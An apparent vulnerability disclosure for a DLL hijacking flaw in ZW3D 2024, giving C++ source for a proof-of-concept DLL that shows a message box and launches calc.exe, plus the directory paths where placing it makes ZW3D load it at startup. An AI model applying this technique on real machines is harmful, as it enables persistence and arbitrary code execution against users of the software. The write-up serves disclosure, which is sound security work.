# Vulnerability exploit

To demonstrate the effect of a simple attack, the following is a simple code to generate a DLL, which acts as a pop-up window and starts "calc.exe"：


```C++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include "windows.h"
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// evil code
	MessageBox(NULL, TEXT("已加载 evildll"), TEXT("test"), MB_OK);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```
![image](https://github.com/q1jun/ZW3D_DLL_hijack/assets/57565901/44735207-1796-44af-a217-ed721d8a60ef)

After compiling it into a DLL file, put it into the "C:\Users\{username}\AppData\Roaming\ZWSOFT\ZW3D\ZW3D\custom\apilibs" or "{Installation Path}\apilibs" directory. The "apilibs" directory does not exist after the default installation. Yes, you can create the directory manually:
![image](https://github.com/q1jun/ZW3D_DLL_hijack/assets/57565901/93186e63-4da4-416d-9f0e-cd5a549a35f5)

Put the compiled "evildll.dll" file into:
![image](https://github.com/q1jun/ZW3D_DLL_hijack/assets/57565901/3c35e3da-05a1-4f0b-b8d5-edfc27675935)

Start "ZW3D 2024", trigger the pop-up window and pop-up calculator, successfully execute the malicious DLL, and achieve a simple attack effect:
![image](https://github.com/q1jun/ZW3D_DLL_hijack/assets/57565901/7a602a99-dea0-4d36-b16b-a414ab1b890e)


CVSS3.1 score：8.2
CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
